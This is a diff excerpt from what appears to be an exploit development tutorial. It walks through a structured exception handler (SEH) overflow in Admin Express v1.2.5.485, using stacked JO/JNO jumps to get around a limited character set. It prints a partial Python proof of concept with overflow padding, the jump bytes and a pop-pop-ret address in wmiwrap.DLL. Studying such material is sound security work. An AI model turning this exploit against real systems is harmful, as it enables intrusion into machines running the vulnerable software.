@@ -154,3 +154,31 @@ Look at the below screenshot. These are what are known as the flags. These flags
 <img src="{{ site.url }}{{ site.baseurl }}/images/9.png" alt="">
 
 Look in the above image at the `O` flag. This is the flag we will be using! `JO` (Jump Overflow) is an opcode that will perform the amount of bytes appended to the opcode __IF__ that flag is set to `1`, at the time of execution. A `JNO` (Jump If Not Overflow) will occur if the `O` flag is set to 0 at the time of execution.
+
+The reason why we would want to use these opcodes is simple. They adhere to the character set we are limited to! The opcode for `JO` is `\x70` and the opcode for `JNO` is `\x71`. We can actually do something pretty clever here, too. Since these are conditional jumps, that means there must be some type of event or sentiment that must be present in order for the jump to happen. Instead of trying to manipulate the flags to meet the condition needed by the jump, you can stack the opcodes! Here is an example of this: 
+
+If I input an opcode of `\x70\x06\x71\x06` this means my instruction will do a `JO` 6 bytes forward __THEN__ a `JNO` 6 bytes forward. But, if my first instruction gets executed, I can disregard the fact I ever had the second instruction. And if the first instruction does not execute, it will default to the second instruction! Before we update the PoC, I want to show something that happened on the stack after our `pop <reg> pop <reg> ret` instructions. There are a few null bytes that were thrown on to the stack as seen below:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/10.png" alt="">
+
+Due to this fact, we are going to do a lot of jumps away from these bytes. I am a person who likes to plan ahead, and knowing these bytes are there worries me a bit in terms of writing shellcode later. Since `7E` is our last allowed character, which is 126 in decimal. This means we are going to make a 126 byte jump forward. 
+
+Since calculating a negative number in hex requires the two's compliment, this generally means the number will be outside our character range. Anyways, here is the updated PoC:
+
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e" 		# JO 126 hex bytes. If jump fails, default to JNO 126 hex bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+payload += "\x43" * (5000-len(payload))
+
+print payload
+
+#f = open('pwn.txt', 'w')
+#f.write(payload)
+#f.close()
+```
+
